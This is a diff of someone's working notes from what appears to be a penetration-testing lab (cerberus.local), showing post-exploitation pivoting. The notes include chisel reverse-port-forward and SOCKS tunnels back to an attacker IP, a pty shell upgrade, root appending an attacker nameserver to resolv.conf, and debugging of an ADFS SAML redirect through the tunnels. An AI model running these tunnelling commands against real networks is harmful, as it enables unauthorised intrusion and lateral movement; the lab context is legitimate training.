@@ -288,10 +288,39 @@ echo "nameserver 10.10.16.24" >> /etc/resolv.conf
 sudo ./chisel server -p 8082 --reverse 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-.\chisel.exe client 172.16.22.2:9094 R:443:localhost:443
-R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+.\chisel.exe client 172.16.22.2:9095 R:80:localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
 
-./chisel server -p 9094 --reverse
+./chisel client 10.10.16.24:8081 R:socks
 
-./chisel client 10.10.16.24:8006 R:443:localhost:443
 
+for some reason single proxies work
+
+.\chisel.exe client 172.16.22.2:9095 R:9251:localhost:9251
+
+./chisel server -p 9095 --reverse
+
+./chisel client 10.10.16.24:8006 R:9251:localhost:9251
+
+8888 redirects to 9251
+
+even after that it did not load
+
+![](20230626144902.png)
+
+when I am putting 9251 its working
+
+but it keeps redirecting to 443 so
+
+su -
+root@icinga:~# ./chisel client 10.10.16.24:8006 R:443:localhost:9251
+./chisel client 10.10.16.24:8006 R:443:localhost:9251
+
+![](20230626150120.png)
+
+still not getting the thing
+authorization always redirects
+
+https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVPLbtswELz3KwTerQetyDJhKXDtBjXgtIKt9NBLQZMrhwBFuiTlJH8fyo%2FULVoXaE8EyNnd2Znh5Pa5lcEejBVaFSgJYxSAYpoLtS3QQ303yNFt%2BW5iaSvxjkw796hW8L0D64KptWCcr5tpZbsWzBrMXjB4WC0L9OjczpIoms%2FIGN8kUd9gqbdCRdmI5jyJk2wcpzHmLKPZKE03ecNyOmI0oazJ8w1uUDD3U4Si7kDt3JCzkIHZgOlsKDWjMqK8sZG0EQoW8wJ9G44A51nMU2h4ikd5usmGnCY3PMfNMGbMw6ztYKGso8oVCMd4OIizAc7qZEzilOBxmMfJVxRURjvNtHwv1FGPziiiqRWWKNqCJY6R9fR%2BSXAYk80RZMnHuq4G1ed1fWiwFxzMJ48u0D1VdAsflBcBgul8DbI5KRZUsrMo%2BHK2Afc2eGOUJUfhr4%2FenXii8ugTOSxogjttWuqu1%2FY3gg%2BaA5SAcsK9%2FDT7ejk9ZwCV%2F%2B%2F4JLqkX55D16u3mFdaCvYSTKXUTzMD1HlFnekA%2FXXNJEx%2BWbNTdgdMNAI4it7mnHIN%2FJByH2oHzy6Y6XZHjbC9L%2FBMmXtT%2BRI2k16JFTT%2FpNxVGCOs7%2B2vK388acP7WALzPGtD%2FSLauLNwv2NUnh7%2FsN%2BP58u%2FXb4C&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
+
+its not working 
+lets try withot proxychains once
